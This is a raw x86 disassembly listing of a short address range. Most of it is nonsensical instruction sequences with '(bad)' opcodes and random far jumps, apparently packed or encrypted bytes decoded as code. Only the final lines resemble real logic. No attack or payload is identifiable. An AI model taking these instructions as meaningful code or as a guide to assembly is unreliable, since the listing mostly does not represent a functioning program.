  40e365:	dec    esp
  40e366:	(bad)  
  40e368:	dec    ebp
  40e369:	outs   dx,DWORD PTR ds:[esi]
  40e36a:	(bad)  
  40e36c:	sbb    edx,DWORD PTR [eax]
  40e36e:	push   edi
  40e36f:	sbb    DWORD PTR [eax],ebp
  40e371:	out    dx,al
  40e372:	out    dx,eax
  40e373:	mov    dl,0xae
  40e375:	repz cld 
  40e377:	sbb    eax,0x5f07ed00
  40e37c:	add    eax,0x365d4918
  40e381:	push   ss
  40e382:	inc    edx
  40e383:	jne    0x40e3e2
  40e385:	scas   eax,DWORD PTR es:[edi]
  40e386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e387:	adc    DWORD PTR [esi+ecx*8],esi
  40e38a:	jmp    0x6170:0x4aa5e7c2
  40e391:	jmp    0xd17f:0x87d0665d
  40e398:	xchg   ebp,eax
  40e399:	lods   eax,DWORD PTR ds:[esi]
  40e39a:	and    eax,DWORD PTR [ebp+0x70]
  40e39d:	inc    ebx
  40e39e:	bound  edi,QWORD PTR [ecx]
  40e3a0:	xor    BYTE PTR [edx],ah
  40e3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3a3:	sub    esi,DWORD PTR [ecx+0x14]
  40e3a6:	cmp    eax,0xf1870494
  40e3ab:	mov    al,ds:0xe5346129
  40e3b0:	outs   dx,DWORD PTR ds:[esi]
  40e3b1:	mov    ecx,0x3f751014
  40e3b6:	push   ss
  40e3b7:	outs   dx,DWORD PTR ds:[esi]
  40e3b8:	ret    
  40e3b9:	jns    0x40e436
  40e3bb:	mov    BYTE PTR [eax],ch
  40e3bd:	cmp    al,0x71
  40e3bf:	xor    al,0xb6
  40e3c1:	mov    BYTE PTR ds:0x74857023,al
  40e3c7:	pop    ecx
  40e3c8:	jge    0x40e3cb
  40e3ca:	inc    eax
  40e3cb:	sbb    dh,0x53
  40e3ce:	pop    ecx
  40e3cf:	cmc    
  40e3d0:	ss fdiv st,st(6)
  40e3d3:	mov    cl,0x42
  40e3d5:	or     ebp,DWORD PTR [ebx+eax*8]
  40e3d8:	aaa    
  40e3d9:	nop
  40e3da:	sub    al,dh
  40e3dc:	imul   ecx,ecx,0xffffff92
  40e3df:	dec    esi
  40e3e0:	mul    DWORD PTR [ebx+0x77]
  40e3e3:	push   ecx
  40e3e4:	scas   eax,DWORD PTR es:[edi]
  40e3e5:	(bad)  
  40e3e6:	pop    eax
  40e3e7:	outs   dx,DWORD PTR ds:[esi]
  40e3e8:	add    BYTE PTR [edi+0x61],ah
  40e3eb:	adc    al,0xd2
  40e3ed:	add    eax,0xd92902c
  40e3f2:	das    
  40e3f3:	dec    edx
  40e3f4:	xor    cl,cl
  40e3f6:	call   0x4b1a851
  40e3fb:	xchg   ecx,eax
  40e3fc:	xor    eax,0xeab00fc5
  40e401:	cmc    
  40e402:	push   ebx
  40e403:	pushf  
  40e404:	mov    ebp,DWORD PTR [eax+0x1eb52101]
  40e40a:	mov    al,0x4b
  40e40c:	and    BYTE PTR [edi+0x1b0dced2],0x9
  40e413:	xlat   BYTE PTR ds:[ebx]
  40e414:	je     0x40e3b7
  40e416:	cmp    eax,0x3eb71155
  40e41b:	(bad)  
  40e41c:	jbe    0x40e450
  40e41e:	inc    ecx
  40e41f:	mov    ah,BYTE PTR [ebx-0x70]
  40e422:	adc    DWORD PTR ds:0x484bf8c7,esi
  40e428:	mov    ds,WORD PTR [ecx]
  40e42a:	in     eax,0x62
  40e42c:	(bad)  
  40e42d:	mov    cl,0xc8
  40e42f:	mov    esp,0xf0f3da4b
  40e434:	addr16 aas 
  40e436:	and    DWORD PTR [esp+ebp*2+0x2cbf5a5f],edx
  40e43d:	dec    ebp
  40e43e:	jae    0x40e4ab
  40e440:	mov    si,0xd122
  40e444:	cmp    DWORD PTR ds:[edi-0x4f],edi
  40e448:	(bad)  
  40e449:	and    eax,DWORD PTR ds:0x1910a80e
  40e44f:	ror    DWORD PTR [edx-0x24],0x11
  40e453:	inc    ecx
  40e454:	or     bh,bh
  40e456:	jl     0x40e42e
  40e458:	(bad)  
  40e459:	mov    ebp,0x6946aeeb
  40e45e:	cmp    esi,DWORD PTR [ecx-0x1896f599]
  40e464:	shr    DWORD PTR [eax-0x738e6ba0],1
  40e46a:	nop
  40e46b:	out    0x56,eax
  40e46d:	aam    0xea
  40e46f:	cs retf 
  40e471:	jne    0x40e449
  40e473:	call   0xfd57:0xb5a3ae07
  40e47a:	and    cl,bl
  40e47c:	sub    BYTE PTR [eax-0x47004e84],bl
  40e482:	fldenv [eax+0x1c]
  40e485:	dec    ebp
  40e486:	mov    bl,0xe1
  40e488:	dec    eax
  40e489:	popa   
  40e48a:	xchg   esp,eax
  40e48b:	xchg   BYTE PTR [edx-0x36ce9307],ch
  40e491:	adc    al,0x10
  40e493:	hlt    
  40e494:	pop    ds
  40e495:	dec    esp
  40e496:	mov    al,ds:0x3b9969a
  40e49b:	mov    dh,0xbb
  40e49d:	shl    BYTE PTR [ebx+eax*2],1
  40e4a0:	or     eax,0x911acabe
  40e4a5:	ss shl dl,cl
  40e4a8:	or     eax,esi
  40e4aa:	(bad)  
  40e4ab:	test   ebp,0x284cd092
  40e4b1:	fisub  DWORD PTR [eax+0x56a862f]
  40e4b7:	jge    0x40e4be
  40e4b9:	mov    ds:0xacc504fc,al
  40e4be:	ret    
  40e4bf:	ins    DWORD PTR es:[edi],dx
  40e4c0:	xchg   ecx,eax
  40e4c1:	mov    ?,esi
  40e4c3:	test   al,0xfe
  40e4c5:	adc    al,0xfe
  40e4c7:	jb     0x40e465
  40e4c9:	push   edx
  40e4ca:	stos   DWORD PTR es:[edi],eax
  40e4cb:	dec    edx
  40e4cc:	dec    ecx
  40e4cd:	push   0x219bf18c
  40e4d2:	xor    al,0xb
  40e4d4:	inc    esi
  40e4d5:	ret    0x290f
  40e4d8:	sbb    bl,BYTE PTR [ebp+0x4a6807b4]
  40e4de:	ret    
  40e4df:	xor    BYTE PTR [eax+0x32],dl
  40e4e2:	adc    cl,BYTE PTR [ecx]
  40e4e4:	xor    ecx,DWORD PTR [ebx]
  40e4e6:	mov    edi,0xd56b2642
  40e4eb:	adc    al,0xc9
  40e4ed:	cli    
  40e4ee:	stos   BYTE PTR es:[edi],al
  40e4ef:	xor    BYTE PTR [edx+0x7883705],cl
  40e4f5:	cmp    al,0x23
  40e4f7:	xchg   edi,eax
  40e4f8:	outs   dx,DWORD PTR ds:[esi]
  40e4f9:	ja     0x40e53c
  40e4fb:	dec    ebp
  40e4fc:	jp     0x40e4c3
  40e4fe:	pop    eax
  40e4ff:	in     eax,dx
  40e500:	jmp    DWORD PTR [edi-0x3bbcabd1]
  40e506:	loop   0x40e561
  40e508:	or     ah,bl
  40e50a:	mov    esi,0x9938630c
  40e50f:	or     BYTE PTR [bp+si],bl
  40e512:	into   
  40e513:	inc    ebp
  40e514:	inc    edi
  40e515:	retf   0x9a18
  40e518:	xchg   esp,eax
  40e519:	stc    
  40e51a:	xchg   esp,eax
  40e51b:	jmp    0xa415:0x312ef2dc
  40e522:	xor    eax,0x737d3e4f
  40e527:	cmp    al,0xcf
  40e529:	aas    
  40e52a:	pop    ebx
  40e52b:	push   edx
  40e52c:	dec    edi
  40e52d:	inc    edx
  40e52e:	cmp    al,0x6
  40e530:	mov    ds:0x62d96210,al
  40e535:	cwde   
  40e536:	push   es
  40e537:	scas   eax,DWORD PTR es:[edi]
  40e538:	mov    WORD PTR [esi+edx*8+0x47093253],cs
  40e53f:	or     BYTE PTR [eax-0x7ca8d5be],0xe0
  40e546:	shl    BYTE PTR [eax+0x76f66d66],1
  40e54c:	loop   0x40e4fb
  40e54e:	mov    esp,0x477b5798
  40e553:	jb     0x40e4db
  40e555:	std    
  40e556:	jmp    0xa122:0x6adb158f
  40e55d:	pop    ecx
  40e55e:	cld    
  40e55f:	fwait
  40e560:	cmp    edx,edx
  40e562:	sbb    eax,0x91acb7de
  40e567:	mov    ebp,0x3fd45cfa
  40e56c:	push   0xffffffc9
  40e56e:	mov    edi,0xabe99a0d
  40e573:	in     al,dx
  40e574:	push   ebx
  40e575:	retf   
  40e576:	sbb    edx,DWORD PTR [edi-0x4afac4bd]
  40e57c:	or     eax,0x2b72bcaa
  40e581:	dec    edi
  40e582:	pop    ecx
  40e583:	loop   0x40e51a
  40e585:	xlat   BYTE PTR ds:[ebx]
  40e586:	int    0x8e
  40e588:	mov    ch,0x7
  40e58a:	imul   edx,edx,0x5330313f
  40e590:	jns    0x40e5eb
  40e592:	push   ebp
  40e593:	mov    bh,0x3a
  40e595:	sub    ch,BYTE PTR [edx+edx*8]
  40e598:	jg     0x40e5b5
  40e59a:	data16 int 0x59
  40e59d:	inc    esp
  40e59e:	dec    ebp
  40e59f:	mov    ebp,0xf44c86f5
  40e5a4:	sbb    DWORD PTR [esi],esp
  40e5a6:	sahf   
  40e5a7:	cli    
  40e5a8:	push   0x33
  40e5aa:	loop   0x40e543
  40e5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5ad:	mov    ebp,0x35f7602d
  40e5b2:	fnop   
  40e5b4:	adc    DWORD PTR [eax],ecx
  40e5b6:	cld    
  40e5b7:	out    dx,eax
  40e5b8:	cmp    al,ah
  40e5ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5bb:	and    edx,DWORD PTR [esp+edx*2+0x23]
  40e5bf:	mov    edx,0xa687c1c6
  40e5c4:	push   ebp
  40e5c5:	stos   BYTE PTR es:[edi],al
  40e5c6:	popf   
  40e5c7:	neg    DWORD PTR [ecx]
  40e5c9:	sbb    BYTE PTR [edi+0x10],dh
  40e5cc:	dec    eax
  40e5cd:	fs jbe 0x40e5b3
  40e5d0:	aaa    
  40e5d1:	in     eax,0x8e
  40e5d3:	loope  0x40e56e
  40e5d5:	or     al,0x9d
  40e5d7:	cmp    eax,0xf7269b0e
  40e5dc:	and    esi,DWORD PTR [edi]
  40e5de:	data16 sub bl,ch
  40e5e1:	lods   eax,DWORD PTR ds:[esi]
  40e5e2:	std    
  40e5e3:	clc    
  40e5e4:	pop    eax
  40e5e5:	neg    ebx
  40e5e7:	mov    ds:0xfcf051a2,al
  40e5ec:	xor    dh,ah
  40e5ee:	lods   al,BYTE PTR ds:[esi]
  40e5ef:	(bad)  
  40e5f0:	into   
  40e5f1:	lods   al,BYTE PTR ds:[esi]
  40e5f2:	mov    ch,0x6a
  40e5f4:	pop    ebx
  40e5f5:	pushf  
  40e5f6:	jns    0x40e62d
  40e5f8:	and    al,0xc5
  40e5fa:	xor    esp,DWORD PTR [ecx+edi*8-0x19323e13]
  40e601:	xor    al,0xab
  40e603:	push   es
  40e604:	scas   al,BYTE PTR es:[edi]
  40e605:	pop    ss
  40e606:	lock mov ah,0xf3
  40e609:	cmp    BYTE PTR [ebx],0x17
  40e60c:	xchg   ebx,eax
  40e60d:	mov    ebp,0x5ed1673b
  40e612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e613:	inc    edx
  40e614:	add    dh,dl
  40e616:	xor    eax,0x7b801b35
  40e61b:	jp     0x40e688
  40e61d:	stc    
  40e61e:	ss inc ebp
  40e620:	repnz pop ebp
  40e622:	or     ecx,eax
  40e624:	sti    
  40e625:	stc    
  40e626:	inc    eax
  40e627:	aad    0xce
  40e629:	jae    0x40e628
  40e62b:	sbb    BYTE PTR [esi],dl
  40e62d:	pop    ecx
  40e62e:	push   eax
  40e62f:	mov    dh,0x8e
  40e631:	sbb    esi,DWORD PTR [ecx]
  40e633:	mov    eax,0x4492d061
  40e638:	xchg   ebp,eax
  40e639:	jmp    0xad35:0xf641d59e
  40e640:	mov    al,ds:0x427f3570
  40e645:	mov    cl,0x7f
  40e647:	push   ebx
  40e648:	rcl    BYTE PTR [ebx-0x1dae2a88],cl
  40e64e:	nop
  40e64f:	in     al,0x6c
  40e651:	xchg   edi,eax
  40e652:	jl     0x40e61d
  40e654:	push   edi
  40e655:	cmp    DWORD PTR [ebx-0x66],ecx
  40e658:	loopne 0x40e5ea
  40e65a:	in     al,dx
  40e65b:	mov    ebx,0x600fe2e2
  40e660:	fisubr WORD PTR [edi+eiz*1-0x26]
  40e664:	push   es
  40e665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e666:	ds dec esi
  40e668:	imul   ebx,DWORD PTR [esi+0x225dc4bb],0xea4f3715
  40e672:	scas   al,BYTE PTR es:[edi]
  40e673:	mov    eax,ds:0x32ba863d
  40e678:	inc    edi
  40e679:	sbb    BYTE PTR [edi],bh
  40e67b:	in     eax,dx
  40e67c:	repz jg 0x40e64b
  40e67f:	and    al,0x60
  40e681:	paddd  mm3,QWORD PTR [ebp+0x1e]
  40e685:	mov    al,0x42
  40e687:	mov    ebp,0x3479d399
  40e68c:	jo     0x40e6b3
  40e68e:	test   al,0xf3
  40e690:	pop    eax
  40e691:	int3   
  40e692:	pop    ecx
  40e693:	sub    ch,bl
  40e695:	adc    al,0xf9
  40e697:	shl    DWORD PTR [esi],1
  40e699:	jmp    0x40e6a6
  40e69b:	scas   eax,DWORD PTR es:[edi]
  40e69c:	das    
  40e69d:	aad    0xfd
  40e69f:	mov    esi,0x78f72d7b
  40e6a4:	sahf   
  40e6a5:	jmp    0xdb6:0x5b81d22b
  40e6ac:	sahf   
  40e6ad:	jae    0x40e66b
  40e6af:	push   0xf08a1dde
  40e6b4:	sub    ebp,DWORD PTR ds:0xba69a0d9
  40e6ba:	jecxz  0x40e6dc
  40e6bc:	outs   dx,DWORD PTR ds:[esi]
  40e6bd:	iret   
  40e6be:	sub    DWORD PTR [ebx],ebp
  40e6c0:	sbb    al,0x1c
  40e6c2:	xchg   ebx,eax
  40e6c3:	in     al,0x3e
  40e6c5:	fld    TBYTE PTR [edx+ebp*1-0x7]
  40e6c9:	cdq    
  40e6ca:	sahf   
  40e6cb:	cmp    esi,DWORD PTR [edi+0x4b]
  40e6ce:	xor    BYTE PTR [eax],dh
  40e6d0:	sbb    edx,DWORD PTR [ecx-0x765e6b14]
  40e6d6:	add    ecx,ebp
  40e6d8:	rol    DWORD PTR [ebx],0x0
  40e6db:	add    BYTE PTR [ebx],cl
  40e6dd:	push   0x67
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e74a
  40e6e9:	int3   
  40e6ea:	aad    0x46
  40e6ec:	ins    BYTE PTR es:[edi],dx
  40e6ed:	mov    eax,ds:0x79a77c7c
  40e6f2:	jl     0x40e770
  40e6f4:	fdivr  DWORD PTR [edi]
  40e6f6:	push   DWORD PTR [edx-0x76]
  40e6f9:	jmp    0xea6e:0x86e62c4e
  40e700:	es push cs
  40e702:	test   al,0x71
  40e704:	and    BYTE PTR [eax],0x12
  40e707:	aad    0xe3
  40e709:	rol    BYTE PTR [ebp-0x2a],1
  40e70c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e70d:	sbb    ebp,eax
  40e70f:	shl    DWORD PTR [ebp-0x27f7b9da],0x7b
  40e716:	fnsave [ebx]
  40e718:	add    edi,eax
  40e71a:	sub    esp,0xd0a3514b
  40e720:	dec    ecx
  40e721:	xor    BYTE PTR [esi-0x48],0xdb
  40e725:	jg     0x40e741
  40e727:	cli    
  40e728:	ja     0x40e727
  40e72a:	pop    ds
  40e72b:	push   0x61fd7f14
  40e730:	scas   al,BYTE PTR es:[edi]
  40e731:	pcmpeqd mm1,QWORD PTR [edi-0x315148c9]
  40e738:	lods   al,BYTE PTR ds:[si]
  40e73a:	xchg   edi,eax
  40e73b:	rol    DWORD PTR [eax+ebx*1],1
  40e73e:	hlt    
  40e73f:	xchg   ebp,eax
  40e740:	cmc    
  40e741:	mov    edx,0x87265ca1
  40e746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e747:	mov    cl,0xbc
  40e749:	out    dx,al
  40e74a:	mov    DWORD PTR [eax+0x4037ead8],esp
  40e750:	lds    ebx,FWORD PTR [edx]
  40e752:	mov    DWORD PTR [edi-0x5d],esi
  40e755:	jg     0x40e76a
  40e757:	mov    ds:0xcea8ffd8,eax
  40e75c:	cmp    cl,BYTE PTR [esp+edx*1]
  40e75f:	in     eax,dx
  40e760:	pop    es
  40e761:	imul   edx,DWORD PTR [ebp-0x5002c80f],0xffffffda
  40e768:	aam    0x9d
  40e76a:	fdiv   DWORD PTR [esi+0xb]
  40e76d:	sahf   
  40e76e:	jle    0x40e73a
  40e770:	inc    ebx
  40e771:	lahf   
  40e772:	or     esp,0x5c
  40e775:	or     eax,0x523abffa
  40e77a:	mov    dh,0xe9
  40e77c:	daa    
  40e77d:	dec    esi
  40e77e:	shld   esi,edx,cl
  40e781:	push   0x9159e083
  40e786:	mov    esi,0x72026984
  40e78b:	lahf   
  40e78c:	dec    eax
  40e78d:	sub    BYTE PTR ds:0x333f28d,ch
  40e793:	idiv   BYTE PTR ds:0x99bd34e8
  40e799:	or     eax,0xbdb647ea
  40e79e:	xlat   BYTE PTR ds:[ebx]
  40e79f:	xchg   ebx,eax
  40e7a0:	dec    ebp
  40e7a1:	stos   BYTE PTR es:[edi],al
  40e7a2:	sets   BYTE PTR [eax-0x63]
  40e7a6:	or     DWORD PTR [eax-0x4590ca9d],esp
  40e7ac:	or     esp,DWORD PTR [edi-0x2a227bd4]
  40e7b2:	rcl    BYTE PTR [eax-0x78],cl
  40e7b5:	ficom  WORD PTR [ebx-0x36aaa04a]
  40e7bb:	sbb    al,0xfe
  40e7bd:	fcmovnb st,st(4)
  40e7bf:	addr16 mov eax,ds:0x9fc1
  40e7c3:	sub    eax,0x2140aea3
  40e7c8:	sahf   
  40e7c9:	lods   al,BYTE PTR ds:[esi]
  40e7ca:	(bad)  
  40e7cb:	fst    DWORD PTR [edx]
  40e7cd:	adc    esp,DWORD PTR [esi+0x4de770e5]
  40e7d3:	sub    dl,dl
  40e7d5:	pop    esi
  40e7d6:	scas   al,BYTE PTR es:[edi]
  40e7d7:	pop    esp
  40e7d8:	mov    esi,0xeb9df067
  40e7dd:	cld    
  40e7de:	lahf   
  40e7df:	push   cs
  40e7e0:	arpl   WORD PTR [edi+0x7],cx
  40e7e3:	dec    ebx
  40e7e4:	dec    edx
  40e7e5:	sub    BYTE PTR [ecx-0x6efa8145],ch
  40e7eb:	add    ecx,esp
  40e7ed:	inc    ebx
  40e7ee:	add    DWORD PTR [esi+0x38819c94],edi
  40e7f4:	aaa    
  40e7f5:	stc    
  40e7f6:	push   ss
  40e7f7:	push   ds
  40e7f8:	adc    ah,BYTE PTR ds:0x72d135b7
  40e7fe:	xchg   ebx,eax
  40e7ff:	inc    ebx
  40e800:	in     al,dx
  40e801:	push   di
  40e803:	sbb    DWORD PTR [ebp+eax*4-0x34f1fa78],ebp
  40e80a:	dec    edx
  40e80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e80c:	xchg   edx,eax
  40e80d:	and    al,0xcb
  40e80f:	push   cs
  40e810:	(bad)  
  40e811:	sbb    al,0x64
  40e813:	adc    BYTE PTR [edx],bh
  40e815:	and    dl,BYTE PTR [edx-0x42195527]
  40e81b:	stos   BYTE PTR es:[edi],al
  40e81c:	loop   0x40e890
  40e81e:	pop    ebx
  40e81f:	pop    esp
  40e820:	adc    eax,0xcac65ed9
  40e825:	cmp    eax,0xe9c96812
  40e82a:	push   es
  40e82b:	loopne 0x40e876
  40e82d:	inc    ebx
  40e82e:	fadd   DWORD PTR [ebx+0x3a]
  40e831:	mov    dl,0xe3
  40e833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e834:	pusha  
  40e835:	pop    esp
  40e836:	sbb    al,0x1c
  40e838:	stos   BYTE PTR es:[edi],al
  40e839:	in     al,0xee
  40e83b:	pop    ds
  40e83c:	sbb    al,0xdf
  40e83e:	jb     0x40e7e5
  40e840:	cmovb  ebx,DWORD PTR [ebx+edx*8]
  40e844:	in     eax,dx
  40e845:	loope  0x40e7f0
  40e847:	dec    edi
  40e848:	aad    0xb0
  40e84a:	in     eax,dx
  40e84b:	inc    edi
  40e84c:	bound  esi,QWORD PTR [ebx+edx*4-0x1a2d3f0b]
  40e853:	neg    DWORD PTR [edx-0x12]
  40e856:	scas   eax,DWORD PTR es:[edi]
  40e857:	rcr    bl,cl
  40e859:	jp     0x40e870
  40e85b:	push   edx
  40e85c:	cmp    al,0x1d
  40e85e:	jns    0x40e803
  40e860:	outs   dx,DWORD PTR ds:[esi]
  40e861:	scas   eax,DWORD PTR es:[edi]
  40e862:	mov    al,ds:0xe3de3840
  40e867:	mov    ah,0x33
  40e869:	leave  
  40e86a:	or     eax,0x8ec4def7
  40e86f:	outs   dx,BYTE PTR ds:[esi]
  40e870:	pop    edx
  40e871:	std    
  40e872:	enter  0xc0b3,0x6b
  40e876:	cmp    BYTE PTR [edi-0x78],0xf7
  40e87a:	popf   
  40e87b:	or     al,0x92
  40e87d:	inc    ebp
  40e87e:	and    al,0x2b
  40e880:	shl    BYTE PTR [edx-0x57],cl
  40e883:	nop
  40e884:	adc    eax,DWORD PTR [ebp-0x41dc2df1]
  40e88a:	popf   
  40e88b:	aad    0x95
  40e88d:	add    ebx,edx
  40e88f:	arpl   WORD PTR [ecx+0x6446b5ff],bp
  40e895:	call   0x462e:0x2cea0942
  40e89c:	std    
  40e89d:	shl    DWORD PTR [ecx+edx*2+0x2ff1a2ea],cl
  40e8a4:	lods   eax,DWORD PTR ds:[esi]
  40e8a5:	sub    al,0xf0
  40e8a7:	jmp    0x40e928
  40e8a9:	jno    0x40e8ed
  40e8ab:	sar    DWORD PTR [ecx],1
  40e8ad:	adc    cl,BYTE PTR [esi-0x4e]
  40e8b0:	xchg   ah,ch
  40e8b2:	cmp    al,0x82
  40e8b4:	mov    bh,dl
  40e8b6:	or     al,0x22
  40e8b9:	aas    
  40e8ba:	test   eax,0x6a69a456
  40e8bf:	arpl   WORD PTR [eax],ax
  40e8c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8c2:	mov    bl,0x46
  40e8c4:	fcmovnbe st,st(3)
  40e8c6:	loopne 0x40e92f
  40e8c8:	inc    ecx
  40e8c9:	jg     0x40e940
  40e8cb:	hlt    
  40e8cc:	adc    BYTE PTR [esi-0x652b0b01],dl
  40e8d2:	mov    cl,dh
  40e8d4:	jg     0x40e8c5
  40e8d6:	ds push 0xd39ceca4
  40e8dc:	pop    es
  40e8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8de:	xchg   ebx,eax
  40e8df:	cmp    DWORD PTR [edi-0x1357df4a],ecx
  40e8e5:	push   es
  40e8e6:	(bad)  
  40e8e7:	into   
  40e8e8:	addr16 mov ebp,0xca35ba6c
  40e8ee:	sbb    BYTE PTR [ebp-0x6f408f5a],0x73
  40e8f5:	jp     0x40e8e6
  40e8f7:	dec    ecx
  40e8f8:	mov    cl,0x44
  40e8fa:	mov    ecx,0x1046352c
  40e8ff:	ja     0x40e8c9
  40e901:	or     DWORD PTR [ebx-0x750fe5ee],ecx
  40e907:	cmp    al,0x14
  40e909:	leave  
  40e90a:	add    bh,BYTE PTR [esi-0x7a]
  40e90d:	push   ebp
  40e90e:	shr    DWORD PTR [eax],0x8f
  40e911:	std    
  40e912:	gs idiv al
  40e915:	call   0x68dd3922
  40e91a:	es jmp 0xc3ee5458
  40e920:	jbe    0x40e8ac
  40e922:	jne    0x40e97f
  40e924:	sub    ch,BYTE PTR [eax+0x663defab]
  40e92a:	das    
  40e92b:	xor    al,0xbc
  40e92d:	xor    BYTE PTR [ebx-0x11],dh
  40e930:	adc    ebp,DWORD PTR [ebp+0x33508095]
  40e936:	sub    eax,0xf50f902d
  40e93b:	dec    esi
  40e93c:	out    dx,eax
  40e93d:	add    DWORD PTR [ebx+eiz*8-0x7e6ea20e],esp
  40e944:	pop    esp
  40e945:	mov    dh,0xaa
  40e947:	jl     0x40e8d1
  40e949:	xchg   ebp,eax
  40e94a:	fdiv   QWORD PTR [edx]
  40e94c:	inc    esp
  40e94d:	mov    esi,0xe023e72e
  40e952:	sbb    eax,0x2f051594
  40e957:	call   0xd712dd8c
  40e95c:	retf   
  40e95d:	add    eax,0x92ee727b
  40e962:	jb     0x40e93f
  40e964:	cwde   
  40e965:	jo     0x40e968
  40e967:	call   0xc5106e2f
  40e96c:	jmp    0x8d28:0xa8e93555
  40e973:	mov    dh,BYTE PTR [eax+0x4472a6c7]
  40e979:	pop    esp
  40e97a:	jl     0x40e9bd
  40e97c:	(bad)  
  40e97e:	lods   al,BYTE PTR ds:[esi]
  40e97f:	or     al,0x6e
  40e981:	or     DWORD PTR [ebx],esp
  40e983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e984:	int3   
  40e985:	sbb    al,0xe9
  40e987:	mov    ?,WORD PTR [ecx+0x21f9e3c7]
  40e98d:	and    al,0x56
  40e98f:	sub    al,0x6c
  40e991:	sbb    al,0xa2
  40e993:	mov    BYTE PTR [eax-0x59],al
  40e996:	es imul ecx,esp,0x7523fee6
  40e99d:	add    eax,0x8fb7fdad
  40e9a2:	pop    ebp
  40e9a3:	adc    al,0x1c
  40e9a5:	adc    BYTE PTR [ebp+ecx*2+0x7a],0x48
  40e9aa:	ror    BYTE PTR [ecx+0x2e],0x2d
  40e9ae:	pop    es
  40e9af:	push   esi
  40e9b0:	dec    ecx
  40e9b1:	add    edx,DWORD PTR ds:0xa7cb3bdf
  40e9b7:	ds sti 
  40e9b9:	push   cs
  40e9ba:	mov    bh,BYTE PTR [edx-0x26ae0993]
  40e9c0:	lock push ss
  40e9c2:	xchg   ebx,eax
  40e9c3:	mov    edi,0x9ab8407d
  40e9c8:	das    
  40e9c9:	(bad)  
  40e9cb:	pusha  
  40e9cc:	test   DWORD PTR [ebx+0x254dfd94],esp
  40e9d2:	addr16 enter 0x6f80,0x78
  40e9d7:	cmp    ebx,DWORD PTR [esi-0x3d8a64a]
  40e9dd:	push   edx
  40e9de:	repz cld 
  40e9e0:	push   esp
  40e9e1:	retf   0x1b80
  40e9e4:	add    al,BYTE PTR [esi+esi*4+0x668df1cc]
  40e9eb:	scas   al,BYTE PTR es:[edi]
  40e9ec:	cmp    ebx,eax
  40e9ee:	xlat   BYTE PTR ds:[ebx]
  40e9ef:	es mov ebx,0xf2fa37cf
  40e9f5:	arpl   WORD PTR [eax+0x50],di
  40e9f8:	xor    bl,BYTE PTR [edi+edi*4+0x5c23076d]
  40e9ff:	out    0x0,eax
  40ea01:	push   esi
  40ea02:	mov    ah,0x49
  40ea04:	mov    al,ss:0xeccebfdd
  40ea0a:	sub    ecx,DWORD PTR [ecx+0x11]
  40ea0d:	ja     0x40e9b2
  40ea0f:	out    0xd5,eax
  40ea11:	retf   0x3d4c
  40ea14:	sbb    ah,BYTE PTR ds:0x99396d14
  40ea1a:	aam    0x12
  40ea1c:	sti    
  40ea1d:	aad    0xe9
  40ea1f:	test   dl,cl
  40ea21:	pop    edx
  40ea22:	mov    ds:0x56c3a545,al
  40ea27:	scas   al,BYTE PTR es:[edi]
  40ea28:	jl     0x40e9e6
  40ea2a:	add    DWORD PTR [ecx],0xffffffdf
  40ea2d:	xor    ebp,edi
  40ea2f:	inc    edi
  40ea30:	xor    ah,0xa4
  40ea33:	cdq    
  40ea34:	jmp    0xd84c6c2
  40ea39:	int    0x5c
  40ea3b:	mov    ds:0xf9af3f76,al
  40ea40:	sub    cl,ah
  40ea42:	js     0x40ea18
  40ea44:	shl    BYTE PTR [esi-0x4e],cl
  40ea47:	mov    bh,0xc5
  40ea49:	push   cs
  40ea4a:	aas    
  40ea4b:	inc    ebx
  40ea4c:	in     eax,0x59
  40ea4e:	mov    bl,0xe1
  40ea50:	add    ebx,DWORD PTR [ebx]
  40ea52:	rol    DWORD PTR [ebp-0x4],cl
  40ea55:	bound  edi,QWORD PTR fs:[ebp+0x22]
  40ea59:	test   DWORD PTR ds:0xad03d485,edx
  40ea5f:	sub    edi,esp
  40ea61:	aas    
  40ea62:	sbb    dh,BYTE PTR [bx+di]
  40ea65:	pop    es
  40ea66:	push   ds
  40ea67:	push   0x1e
  40ea69:	jge    0x40ea4e
  40ea6b:	out    0x73,al
  40ea6d:	mov    ecx,DWORD PTR [edi+0x77]
  40ea70:	fst    QWORD PTR [ebp+0x61]
  40ea73:	stos   BYTE PTR es:[edi],al
  40ea74:	cmp    bh,bl
  40ea76:	adc    al,0x80
  40ea78:	mov    al,0xf
  40ea7a:	mov    bh,0x87
  40ea7c:	jmp    0x40eadc
  40ea7e:	fild   QWORD PTR [edi-0x63456446]
  40ea84:	lahf   
  40ea85:	sbb    DWORD PTR [eax+0x7e7865bf],0xffffffd1
  40ea8c:	inc    ecx
  40ea8d:	popf   
  40ea8e:	std    
  40ea8f:	mov    ds:0x35b35121,al
  40ea94:	(bad)  
  40ea95:	sti    
  40ea96:	pusha  
  40ea97:	pop    esi
  40ea98:	push   eax
  40ea99:	push   edx
  40ea9a:	mov    fs,eax
  40ea9c:	loop   0x40ea29
  40ea9e:	inc    ebp
  40ea9f:	clc    
  40eaa0:	jmp    0x40f269
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0x4683fe94
  40ead0:	bound  edx,QWORD PTR [edi]
